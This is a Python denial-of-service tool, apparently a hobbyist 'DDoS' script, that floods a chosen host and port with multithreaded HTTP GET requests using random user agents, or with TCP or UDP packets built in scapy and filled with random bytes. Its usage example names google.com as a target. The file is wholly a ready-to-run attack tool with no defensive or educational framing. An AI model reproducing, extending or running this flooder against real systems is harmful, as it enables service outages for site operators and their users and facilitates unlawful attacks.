# -*- coding: utf-8 -*-

import sys
import time
import socket
import random
from scapy.all import *
from datetime import datetime
from threading import Thread
from termcolor import colored
from fake_useragent import UserAgent


version = "2.2"

def showBanner():
	with open("lib/banner.txt") as f:
		print(colored( f.read(), "red") + "[" + version + "]\n")

def usageMsg():
	print("USAGE: python " + sys.argv[0] + "  [HOST] [PORT] [THREADS] [DURATION]"
                "\nEXAMPLE: python " + sys.argv[0] + "  http://google.com 80 10000 0.01\n")
	exit(0)

showBanner()
 
ip       = ""
host_arr = []	

if len(sys.argv) == 1:

	while True:

		target     = input("[+]TARGET > ")

		try:
			host_arr = target.split('/')
			host     = host_arr[2]
			ip       = str(socket.gethostbyname(host))
			break

		except:

			if len(target.split('.')) == 4:
				host = target
				ip   = str(host)
				break

			else:
				print(colored("Host is incorrect!","red"))

	while True:

		try:
			port     = int(input("[+]PORT (default: 80) > ") or 80 )
			threads  = int(input("[+]THREADS (default: 20)> ") or 20 ) 
			duration  = float(input("[+]DURATION (default: 5 min) > ") or 5 ) 
			print("")
			break

		except:
			print(colored("Incorrect input!", "red"))

elif len(sys.argv) != 5:
	usageMsg()

else:
	try:
		ip       = ""
		host     = ""
		host_arr = []
		port     = int(sys.argv[2])
		threads  = int(sys.argv[3])
		duration  = float(sys.argv[4])
	except:
		usageMsg()

	try:
		host_arr = sys.argv[1].split('/')
		host     = host_arr[2]
		ip       = str(socket.gethostbyname(host))

	except:

		if len(sys.argv[1].split('.')) == 4:
			host = sys.argv[1]
			ip   = str(host)

		else:
			print(colored("Host is incorrect!\n","red"))
			usageMsg()


url      = ''
i        = 3
req      = 0
err      = 0
d        = "-------------"
prog     = (duration * 60.0) / 100.0

while i < len(host_arr):
	url += host_arr[i] + "/"
	i += 1

url = url.replace("//", "/")

for i in range(len(list(host))):
	d += "-"

print("[*]Author: PixHead")
print(d)
print("[+]TARGET: " + host + " ¦")
print(d)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	sock.connect((host, port))
	print(colored("[*]", "green") + "SUCCESSFULLY CONNECTED!")
except:
	print(colored("[X]", "red") + "ERROR: Host is unreachable...")
	exit(0)

sock.close()

def attackHttp():
	global req
	global err

	while True:
		req += 1
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		ua = UserAgent()

		request  = "GET /" + url + " HTTP/1.1\n"\
				"Host: " + host +"\n"\
                "Connection: close\n"\
                "User-agent: " + ua.random +  "\n"\
                "Referer: http://google.com/\n"\
		"\n"

		try:
			sock.connect((host, port))
			sock.send(request.encode())
		except:
			err += 1
		finally:
			sock.close()

		if req % 1000 == 0:
			print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err, "red") + "] ") 

def attackTcp():
	global req
	global err

	data = random._urandom(1024)
	r    = bytes(IP(dst=host)/TCP(sport=RandShort(), dport=int(port))/data)

	while True:
		req += 1
		sock = socket.socket()

		try:
			sock.connect((ip, port))
			sock.send(r)
		except:
			err += 1
		finally:
			sock.close()

		if req % 1000 == 0:
			print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")

def attackUdp():
	global req
	global err

	data = random._urandom(1024)
	r    = bytes(IP(dst=host)/UDP(dport=int(port))/data)

	while True:
		req += 1
		sock = socket.socket()

		try:
			sock.connect((ip, port))
			sock.send(r)
		except:
				err += 1
		finally:
			sock.close()

		if req % 1000 == 0:
			print(colored("[+]", "green")+ " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")

alltypes = ['udp','tcp','http','1','2','3']
mode     = ""

while True:

	type = str(input("[HTTP/TCP/UDP][1/2/3] > "))

	if type.lower() in alltypes:
		if type == '1' or type.lower() == 'http':
			mode = 'HTTP'
		elif type == '2' or type.lower() == 'tcp':
			mode = 'TCP'
		elif type == '3' or type.lower() == 'udp':
			mode = 'UDP'

		print('[+]Mode set to ' + mode)
		break

	else:
		print(colored('Wrong type!',"red"))
		

print("[*]STARTING...\n")

for i in range(threads):

	if mode == 'HTTP':
		th = Thread(target=attackHttp)
	elif mode == 'TCP':
		th = Thread(target=attackTcp)
	elif mode == 'UDP':
		th = Thread(target=attackUdp)

	try:
		th.daemon = True
		th.start()
	except:
		print(colored("Initialization failed...", "red"))

try:
	time.sleep(duration * 60)
except:
	print(colored("[-]", "yellow") + " ABORT")

print("\nTotal: " + str(req) + ", failed: " + str(err) + "\n")
sys.exit(0)
